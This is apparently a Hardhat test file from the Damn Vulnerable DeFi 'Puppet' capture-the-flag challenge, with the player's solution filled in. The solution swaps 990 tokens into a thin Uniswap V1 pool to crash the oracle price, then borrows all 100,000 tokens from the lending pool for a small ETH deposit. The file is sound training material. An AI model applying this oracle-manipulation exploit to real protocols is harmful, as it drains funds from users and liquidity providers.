const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
}

async function allBalances(who, token, address) {
    let tokenBalance = await token.balanceOf(address);
    let ethBalance = await ethers.provider.getBalance(address);
    console.log(`${who} token balance: ${tokenBalance.toString()}`);
    console.log(`${who} ETH balance:   ${ethBalance.toString()}`);
    console.log();
}

async function uniswapRates(uniswapExchange) {
    // Get Tokens paid by Uniswap for the given amount of User Wei
    let rate = await uniswapExchange.getEthToTokenInputPrice(1e6, { gasLimit: 1e6 });
    console.log("[User Wei] <--> [Exchange Tokens] ")
    console.log(`getEthToTokenInputPrice:  ${1e6} Wei    -> Exchange -> ${rate.toString()} Tokens`)

    // Get Wei    paid by User    for the given amount of Uniswap Tokens
    rate = await uniswapExchange.getEthToTokenOutputPrice(1e6, { gasLimit: 1e6 });
    console.log(`getEthToTokenOutputPrice: ${1e6} Tokens -> User     -> ${rate.toString()} Wei`)
    console.log();

    // Get Wei    paid by Uniswap for the given amount of User Tokens
    rate = await uniswapExchange.getTokenToEthInputPrice(1e6, { gasLimit: 1e6 });
    console.log("[User Tokens] <--> [Exchange Wei] ")
    console.log(`getTokenToEthInputPrice:  ${1e6} Tokens -> Exchange -> ${rate.toString()} Wei`)

    // Get Tokens paid by User    for the given amount of Uniswap Wei
    rate = await uniswapExchange.getTokenToEthOutputPrice(1e6, { gasLimit: 1e6 });
    console.log(`getTokenToEthOutputPrice: ${1e6} Wei    -> User     -> ${rate.toString()} Tokens`)
    console.log();
}

async function getBlockDeadline() {
    const deadline = 600;

    const blockNumber = await ethers.provider.getBlockNumber();
    if (!blockNumber && blockNumber !== 0) {
        throw new Error("invalid block number");
    }

    const block = await ethers.provider.getBlock(blockNumber);
    if (!block) {
        throw new Error("invalid block");
    }

    return block.timestamp + deadline;
}

async function swapTokensForETH(token, uniswapExchange, player, amount) {
    // Calculates Wei paid by Uniswap for the given amount of Tokens
    const ethExpected = await uniswapExchange.getTokenToEthInputPrice(amount, { gasLimit: 1e6 });
    console.log();
    console.log("swapping Token for ETH");
    console.log("Tokens -> Exchange: ", amount);
    console.log("Eth -> Player:      ", ethExpected.toString());

    // Approve Uniswap to spend your ERC20 tokens
    const approveTx = await token.connect(player).approve(uniswapExchange.address, amount);
    await approveTx.wait();

    // Swap ERC20 tokens for ETH
    const deadline = await getBlockDeadline();
    const minETH = ethExpected; //10n ** 17n; // Minimum amount of ETH to receive

    const swapTx = await uniswapExchange.connect(player).tokenToEthSwapInput(amount, minETH, deadline, { gasLimit: 1e6 });
    await swapTx.wait();

    console.log('Tokens swapped for ETH successfully');
    console.log();
}

async function swapTests(token, uniswapExchange, player) {
    await allBalances("Player  ", token, player.address);
    await allBalances("Exchange", token, uniswapExchange.address);
    await uniswapRates(uniswapExchange);

    await swapTokensForETH(token, uniswapExchange, player, 10n * 10n ** 18n);

    await allBalances("Player  ", token, player.address);
    await allBalances("Exchange", token, uniswapExchange.address);
    await uniswapRates(uniswapExchange);

    await swapTokensForETH(token, uniswapExchange, player, 10n * 10n ** 18n);

    await allBalances("Player  ", token, player.address);
    await allBalances("Exchange", token, uniswapExchange.address);
    await uniswapRates(uniswapExchange);

    await swapTokensForETH(token, uniswapExchange, player, 10n * 10n ** 18n);

    await allBalances("Player  ", token, player.address);
    await allBalances("Exchange", token, uniswapExchange.address);
    await uniswapRates(uniswapExchange);
}

describe('[Challenge] Puppet', function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;     //     10
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;       //     10
    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;    //   1000
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;        //     25

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;    // 100000

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetPool', deployer)).deploy(
            token.address,
            uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    // it('Uniswap Tests', async function () {
    //     await swapTests(token, uniswapExchange, player);
    // });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        await allBalances("Player  ", token, player.address);
        await allBalances("Exchange", token, uniswapExchange.address);
        await allBalances("Pool", token, lendingPool.address);
        await uniswapRates(uniswapExchange);

        let rate = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(`Pool DVT<>ETH rate ${POOL_INITIAL_TOKEN_BALANCE.toString()}:${rate.toString()}`);
        console.log();

        await swapTokensForETH(token, uniswapExchange, player, 990n * 10n ** 18n);

        await allBalances("Player  ", token, player.address);
        await allBalances("Exchange", token, uniswapExchange.address);
        await uniswapRates(uniswapExchange);

        rate = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(`Pool DVT<>ETH rate ${POOL_INITIAL_TOKEN_BALANCE.toString()}:${rate.toString()}`);
        console.log();

        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, { value: rate });

        await allBalances("Player  ", token, player.address);
        await allBalances("Exchange", token, uniswapExchange.address);
        await allBalances("Pool", token, lendingPool.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(3);

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, 'Pool still has tokens');

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
    });
});
